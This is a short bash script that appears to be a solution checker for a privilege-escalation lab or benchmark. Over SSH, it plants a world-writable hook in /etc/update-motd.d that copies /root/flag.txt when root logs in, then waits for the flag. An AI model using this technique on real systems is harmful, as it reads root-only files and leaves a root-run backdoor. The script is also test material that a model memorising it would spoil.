#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/motd_flag
cat > /etc/update-motd.d/99-bench <<'\''EOF'\''
#!/bin/sh
if [ "$(id -u)" -eq 0 ]; then
  cat /root/flag.txt > /tmp/motd_flag
fi
EOF
chmod 777 /etc/update-motd.d/99-bench
for i in $(seq 1 45); do
  if test -r /tmp/motd_flag && grep -q FLAG /tmp/motd_flag 2>/dev/null; then
    cat /tmp/motd_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
